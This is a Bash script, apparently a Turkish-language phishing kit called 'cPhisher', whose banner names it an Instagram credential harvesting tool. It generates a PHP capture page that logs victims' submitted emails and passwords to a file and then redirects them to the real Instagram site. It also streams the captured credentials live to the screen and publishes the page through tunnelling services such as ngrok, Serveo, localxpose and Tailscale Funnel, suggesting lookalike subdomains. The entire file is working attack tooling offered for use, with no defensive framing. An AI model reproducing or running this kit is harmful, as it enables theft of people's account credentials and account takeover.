#!/bin/bash

# ============================================================
# cPhisher - Kali Linux Instagram Phishing Tool
# ============================================================

# Renkler
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
BOLD='\033[1m'
NC='\033[0m'

clear

# ============================================================
# KURULUM KONTROL
# ============================================================
setup_tools() {
    echo -e "${CYAN}${BOLD}[*] Gerekli araçlar kontrol ediliyor...${NC}\n"
    
    # npm/nodejs
    if ! command -v npm &> /dev/null; then
        echo -e "${YELLOW}[!]${NC} npm yükleniyor..."
        sudo apt update -qq && sudo apt install -y nodejs npm &> /dev/null
        echo -e "${GREEN}[✓]${NC} npm kuruldu"
    fi
    
    # ngrok
    if ! command -v ngrok &> /dev/null; then
        echo -e "${YELLOW}[!]${NC} ngrok yükleniyor..."
        wget -q https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip -O /tmp/ngrok.zip
        unzip -q /tmp/ngrok.zip -d /tmp/
        sudo mv /tmp/ngrok /usr/local/bin/
        rm /tmp/ngrok.zip
        echo -e "${GREEN}[✓]${NC} ngrok kuruldu"
    fi
    
    # cloudflared
    if ! command -v cloudflared &> /dev/null; then
        echo -e "${YELLOW}[!]${NC} cloudflared yükleniyor..."
        wget -q https://github.com/cloudflare/cloudflared/releases/download/2024.1.0/cloudflared-linux-amd64 -O /tmp/cloudflared
        chmod +x /tmp/cloudflared
        sudo mv /tmp/cloudflared /usr/local/bin/
        echo -e "${GREEN}[✓]${NC} cloudflared kuruldu"
    fi
    
    # expose
    if ! npm list -g expose &> /dev/null 2>&1; then
        echo -e "${YELLOW}[!]${NC} expose yükleniyor..."
        sudo npm install -g expose &> /dev/null
        echo -e "${GREEN}[✓]${NC} expose kuruldu"
    fi
    
    # tailscale
    if ! command -v tailscale &> /dev/null; then
        echo -e "${YELLOW}[!]${NC} tailscale yükleniyor..."
        curl -fsSL https://tailscale.com/install.sh | sh &> /dev/null
        echo -e "${GREEN}[✓]${NC} tailscale kuruldu"
    fi
    
    # lxp (localxpose)
    if ! command -v lxp &> /dev/null; then
        echo -e "${YELLOW}[!]${NC} localxpose yükleniyor..."
        wget -q https://localxpose.io/api/v2/downloads/lxp-linux-amd64 -O /tmp/lxp
        chmod +x /tmp/lxp
        sudo mv /tmp/lxp /usr/local/bin/
        echo -e "${GREEN}[✓]${NC} localxpose kuruldu"
    fi
    
    # frpc
    if ! command -v frpc &> /dev/null; then
        echo -e "${YELLOW}[!]${NC} frpc yükleniyor..."
        wget -q https://github.com/fatedier/frp/releases/download/v0.53.2/frp_0.53.2_linux_amd64.tar.gz -O /tmp/frp.tar.gz
        tar -xzf /tmp/frp.tar.gz -C /tmp/
        sudo mv /tmp/frp_0.53.2_linux_amd64/frpc /usr/local/bin/
        rm -rf /tmp/frp* /tmp/frp_0.53.2_linux_amd64
        echo -e "${GREEN}[✓]${NC} frpc kuruldu"
    fi
    
    echo ""
    echo -e "${GREEN}[✓]${NC} Tüm araçlar hazır!\n"
}

# Direkt kurulum
echo -e "${CYAN}[*]${NC} Gerekli araçlar kurulu duruma getiriliyor...\n"
setup_tools

# ============================================================
# BANNER
# ============================================================
echo -e "${RED}╔══════════════════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${RED}║${NC}${CYAN}                                                                              ${RED}║${NC}"
echo -e "${RED}║${NC}${BOLD}${GREEN}           ██████╗ ██████╗ ██╗  ██╗███████╗██████╗                  ${RED}║${NC}"
echo -e "${RED}║${NC}${BOLD}${GREEN}          ██╔════╝██╔════╝ ██║  ██║██╔════╝██╔══██╗                 ${RED}║${NC}"
echo -e "${RED}║${NC}${BOLD}${GREEN}          ██║     ██║  ███╗███████║███████╗██████╔╝                 ${RED}║${NC}"
echo -e "${RED}║${NC}${BOLD}${GREEN}          ██║     ██║   ██║██╔══██║╚════██║██╔══██╗                 ${RED}║${NC}"
echo -e "${RED}║${NC}${BOLD}${GREEN}          ╚██████╗╚██████╔╝██║  ██║███████║██║  ██║                 ${RED}║${NC}"
echo -e "${RED}║${NC}${BOLD}${GREEN}           ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝                 ${RED}║${NC}"
echo -e "${RED}║${NC}${CYAN}                                                                              ${RED}║${NC}"
echo -e "${RED}║${NC}${BOLD}${YELLOW}            INSTAGRAM CREDENTIAL HARVESTING TOOL                    ${RED}║${NC}"
echo -e "${RED}║${NC}${CYAN}                                  CagriCoder                                      ${RED}║${NC}"
echo -e "${RED}║${NC}${BOLD}${BLUE}  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ ${RED}║${NC}"
echo -e "${RED}║${NC}${CYAN}                                                                              ${RED}║${NC}"
echo -e "${RED}║${NC}${YELLOW}  🎯 Tunnel Options: ${GREEN}Localxpose ${YELLOW}• ${GREEN}Cloudflare ${YELLOW}• ${GREEN}ngrok ${RED}║${NC}"
echo -e "${RED}║${NC}${CYAN}                                                                              ${RED}║${NC}"
echo -e "${RED}║${NC}${BOLD}${BLUE}  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ ${RED}║${NC}"
echo -e "${RED}║${NC}${CYAN}                  Kali Linux Security Framework v1.0                         ${RED}║${NC}"
echo -e "${RED}║${NC}${CYAN}                               Termux v1.0                                            ${RED}║${NC}"
echo -e "${RED}╚══════════════════════════════════════════════════════════════════════════════╝${NC}"
echo ""

# ============================================================
# PORT SEÇİMİ
# ============================================================
read -p "$(echo -e ${YELLOW}[?]${NC} )Port (varsayılan: 8080): " PORT
PORT=${PORT:-8080}

echo -e "${GREEN}[✓]${NC} Port: ${GREEN}${PORT}${NC}"
echo ""

# ============================================================
# URL SEÇİMİ
# ============================================================
read -p "$(echo -e ${YELLOW}[?]${NC} )Redirect URL (varsayılan: https://www.instagram.com): " REDIRECT_URL
REDIRECT_URL=${REDIRECT_URL:-https://www.instagram.com}

echo -e "${GREEN}[✓]${NC} Redirect: ${GREEN}${REDIRECT_URL}${NC}"
echo ""

# ============================================================
# capture.php Oluştur
# ============================================================
cat > capture.php << EOF
<?php
if (\$_SERVER["REQUEST_METHOD"] == "POST") {
    \$email = isset(\$_POST['email']) ? \$_POST['email'] : 'yok';
    \$pass  = isset(\$_POST['pass']) ? \$_POST['pass'] : 'yok';
    
    \$data = "Email: " . \$email . " | Pass: " . \$pass . " | Zaman: " . date('Y-m-d H:i:s') . "\n";
    file_put_contents("logged.txt", \$data, FILE_APPEND);
    
    \$redirect_url = '${REDIRECT_URL}';
    
    // Verilen sitenin HTML'ini çekmeye çalış
    \$html = @file_get_contents(\$redirect_url);
    
    if (\$html === false) {
        // Başarısız olursa redirect yap
        header("Location: " . \$redirect_url);
        exit();
    } else {
        // Çekilen HTML'i göster (User-Agent ekleyin gerçekçi olması için)
        \$ctx = stream_context_create([
            'http' => [
                'header' => 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            ]
        ]);
        \$html = @file_get_contents(\$redirect_url, false, \$ctx);
        if (\$html !== false) {
            echo \$html;
        } else {
            header("Location: " . \$redirect_url);
        }
        exit();
    }
}
?>
EOF

echo -e "${CYAN}[✓]${NC} capture.php güncellendi"
echo ""

# ============================================================
# PHP SERVER
# ============================================================
echo -e "${CYAN}[*]${NC} PHP Server başlatılıyor (Port: ${GREEN}${PORT}${NC})..."
php -S localhost:$PORT > /dev/null 2>&1 &
PHP_PID=$!
sleep 2

if ps -p $PHP_PID > /dev/null 2>&1; then
    echo -e "${GREEN}[✓]${NC} Server çalışıyor - ${GREEN}http://localhost:${PORT}${NC}"
    echo ""
    echo -e "${CYAN}${BOLD}┌─ LOCALHOST ACCESS ${CYAN}─────────────────────────────────────────┐${NC}"
    echo -e "${CYAN}│${NC}"
    echo -e "${CYAN}│${NC}  ${BOLD}${YELLOW}Local URL:${NC}  ${GREEN}http://localhost:${PORT}${NC}"
    echo -e "${CYAN}│${NC}  ${BOLD}${YELLOW}Test Link:${NC}  ${GREEN}http://localhost:${PORT}/index.html${NC}"
    echo -e "${CYAN}│${NC}"
    echo -e "${CYAN}│${NC}  ${YELLOW}→ Tarayıcıda açarak test edin${NC}"
    echo -e "${CYAN}│${NC}"
    echo -e "${CYAN}└────────────────────────────────────────────────────────────────┘${NC}"
    echo ""
else
    echo -e "${RED}[✗]${NC} Server başlatılamadı!"
    exit 1
fi

if [ -f "logged.txt" ]; then
    CAPTURE=$(wc -l < logged.txt)
    echo -e "${CYAN}[!]${NC} Captures: ${MAGENTA}${CAPTURE}${NC}"
else
    echo -e "${CYAN}[!]${NC} Capture file: ${YELLOW}Boş${NC}"
fi

echo ""
# ============================================================
# Live tail for captures
# ============================================================
if [ ! -f "logged.txt" ]; then
    touch logged.txt
fi

echo -e "${CYAN}[*]${NC} Anlık yakalanan şifreler ekranda gösteriliyor..."
tail -n 0 -F logged.txt | while read -r line; do
    echo -e "${MAGENTA}[CAPTURE]${NC} ${line}"
done &
TAIL_PID=$!


# ============================================================
# TUNNEL MENÜ
# ============================================================
echo -e "${CYAN}${BOLD}┌─ TUNNEL SEÇİMİ ${CYAN}──────────────────────────────────────────┐${NC}"
echo -e "${CYAN}│${NC}"
echo -e "${CYAN}│${NC}  ${BOLD}${MAGENTA}[1]${NC} Localxpose"
echo -e "${CYAN}│${NC}  ${BOLD}${MAGENTA}[2]${NC} Cloudflare"
echo -e "${CYAN}│${NC}  ${BOLD}${MAGENTA}[3]${NC} ngrok"
echo -e "${CYAN}│${NC}  ${BOLD}${MAGENTA}[4]${NC} Serveo"
echo -e "${CYAN}│${NC}  ${BOLD}${MAGENTA}[5]${NC} Expose.io"
echo -e "${CYAN}│${NC}  ${BOLD}${MAGENTA}[6]${NC} Frp"
echo -e "${CYAN}│${NC}  ${BOLD}${MAGENTA}[7]${NC} Tailscale"
echo -e "${CYAN}│${NC}  ${BOLD}${RED}[0]${NC} Çık"
echo -e "${CYAN}│${NC}"
echo -e "${CYAN}└────────────────────────────────────────────────────────────────┘${NC}"
echo ""

read -p "$(echo -e ${YELLOW}[?]${NC} )Seçim (0-7): " choice

echo ""

# ============================================================
# TUNNEL BAŞLAT
# ============================================================
case $choice in
    1)
        echo -e "${GREEN}[✓]${NC} Localxpose başlatılıyor..."
        read -p "$(echo -e ${YELLOW}[?]${NC} )Localxpose Token (boş bırak = atla): " LXP_TOKEN
        read -p "$(echo -e ${YELLOW}[?]${NC} )Özel subdomain (örn: instagram-post-2347) (boş = rastgele): " LXP_SUB

        # Build command with optional token/subdomain
        CMD="lxp tunnel http ${PORT}"
        if [ ! -z "$LXP_SUB" ]; then
            CMD="$CMD --subdomain ${LXP_SUB}"
        fi
        if [ ! -z "$LXP_TOKEN" ]; then
            CMD="$CMD --token ${LXP_TOKEN}"
        fi

        echo -e "${CYAN}[*]${NC} Komut: ${GREEN}${CMD}${NC}"
        
        # Start lxp in background and capture output
        LOGFILE="/tmp/lxp_$$.log"
        eval $CMD > "$LOGFILE" 2>&1 &
        LXP_PID=$!
        
        # Wait for URL to appear in log (timeout 10s)
        URL=""
        for i in {1..10}; do
            URL=$(grep -Eo 'https?://[a-z0-9.-]+\.lxp\.sh' "$LOGFILE" | head -n1)
            if [ -n "$URL" ]; then
                break
            fi
            sleep 1
        done
        
        if [ -n "$URL" ]; then
            echo -e "${GREEN}[✓]${NC} Tunnel: ${GREEN}${URL}${NC}"
        else
            echo -e "${YELLOW}[!]${NC} URL henüz gösterilmiyor. Log: ${YELLOW}${LOGFILE}${NC}"
            echo -e "${YELLOW}[!]${NC} Kontrol: cat ${LOGFILE}"
        fi
        
        # Keep lxp process alive
        wait $LXP_PID 2>/dev/null || true
        ;;
    2)
        echo -e "${YELLOW}[!]${NC} Cloudflare şu anda ${RED}BAKIM${NC} modunda."
        ;;
    3)
        if ! command -v ngrok &> /dev/null; then
            echo -e "${RED}[✗]${NC} ngrok yüklü değil!"
            echo -e "${YELLOW}[!]${NC} Kurmak:"
            echo -e "    ${GREEN}cd /tmp && wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip${NC}"
            echo -e "    ${GREEN}unzip ngrok-v3-stable-linux-amd64.zip && sudo mv ngrok /usr/local/bin/${NC}"
        else
            read -p "$(echo -e ${YELLOW}[?]${NC} )ngrok Token: " NGROK_TOKEN
            if [ ! -z "$NGROK_TOKEN" ]; then
                ngrok authtoken $NGROK_TOKEN 2>/dev/null
            fi
            echo -e "${GREEN}[✓]${NC} ngrok başlatılıyor..."
            ngrok http $PORT 2>&1 || echo -e "${RED}[✗] Error${NC}"
        fi
        ;;
    4)
        echo -e "${GREEN}[✓]${NC} Serveo başlatılıyor..."
        ssh -R 80:localhost:$PORT serveo.net 2>&1 || echo -e "${RED}[✗] Error${NC}"
        ;;
    5)
        echo -e "${YELLOW}[!]${NC} Expose şu anda deneysel olarak kullanılamıyor."
        echo -e "${CYAN}[*]${NC} Alternatif tunnel'ları deneyin: ngrok (3), Serveo (4), Frp (6), Tailscale (7), Localxpose (1)"
        ;;
    6)
        echo -e "${CYAN}[*]${NC} frpc.ini oluşturuluyor..."
        cat > frpc.ini << EOF
[common]
server_addr = 127.0.0.1
server_port = 7000
token = 
vhost_http_port = 8081

[web]
type = http
local_port = ${PORT}
custom_domains = localhost
EOF

        # Eğer frps yoksa, otomatik olarak frps indirip başlat
        if ! command -v frps &> /dev/null; then
            echo -e "${YELLOW}[!]${NC} frps bulunamadı — yerel frps başlatılıyor (test için)."
            TMPDIR="/tmp/frp_$$"
            mkdir -p "$TMPDIR"
            wget -q https://github.com/fatedier/frp/releases/download/v0.53.2/frp_0.53.2_linux_amd64.tar.gz -O "$TMPDIR/frp.tar.gz"
            tar -xzf "$TMPDIR/frp.tar.gz" -C "$TMPDIR"
            FRP_BIN_DIR="$TMPDIR/frp_0.53.2_linux_amd64"

            cat > "$TMPDIR/frps.ini" << 'EOL'
[common]
bind_port = 7000
dashboard_port = 7500
dashboard_user = admin
dashboard_pwd = admin
EOL

            echo -e "${CYAN}[*]${NC} frps başlatılıyor (lokal test)..."
            "$FRP_BIN_DIR/frps" -c "$TMPDIR/frps.ini" > "$TMPDIR/frps.log" 2>&1 &
            FRPS_PID=$!
            sleep 2
            if ps -p $FRPS_PID > /dev/null 2>&1; then
                echo -e "${GREEN}[✓]${NC} frps çalışıyor (PID: $FRPS_PID)"
            else
                echo -e "${RED}[✗]${NC} frps başlatılamadı. Log: ${YELLOW}$TMPDIR/frps.log${NC}"
            fi
        fi

        echo -e "${GREEN}[✓]${NC} Frp başlatılıyor..."
        frpc -c frpc.ini 2>&1 || echo -e "${RED}[✗] Error${NC}"
        ;;
    7)
        echo -e "${GREEN}[✓]${NC} Tailscale başlatılıyor..."
        read -p "$(echo -e ${YELLOW}[?]${NC} )Tailscale authkey (boş = web auth ile devam): " TAILSCALE_AUTHKEY

        if [ -n "$TAILSCALE_AUTHKEY" ]; then
            echo -e "${CYAN}[*]${NC} Authkey ile bağlanılıyor..."
            sudo tailscale up --authkey "$TAILSCALE_AUTHKEY" 2>&1 || echo -e "${RED}[✗] Error during tailscale up${NC}"
        else
            echo -e "${CYAN}[*]${NC} Web auth ile devam ediliyor (tarayıcıda verilen URL'yi açıp yetkilendir)."
            sudo tailscale up 2>&1 || echo -e "${RED}[✗] Error${NC}"
        fi

        sleep 2
        sudo tailscale funnel --bg http://localhost:$PORT 2>&1 || echo -e "${RED}[✗] Error${NC}"
        ;;
    0)
        echo -e "${RED}[!]${NC} Kapatılıyor..."
        kill $PHP_PID 2>/dev/null
        kill $TAIL_PID 2>/dev/null || true
        exit 0
        ;;
    *)
        echo -e "${RED}[✗]${NC} Geçersiz seçim!"
        kill $PHP_PID 2>/dev/null
        kill $TAIL_PID 2>/dev/null || true
        exit 1
        ;;
esac

# Kapanış
echo ""
echo -e "${YELLOW}[!]${NC} Sunucu çalışıyor (PID: $PHP_PID)"
echo -e "${YELLOW}[!]${NC} Log: ${GREEN}tail -f logged.txt${NC}"
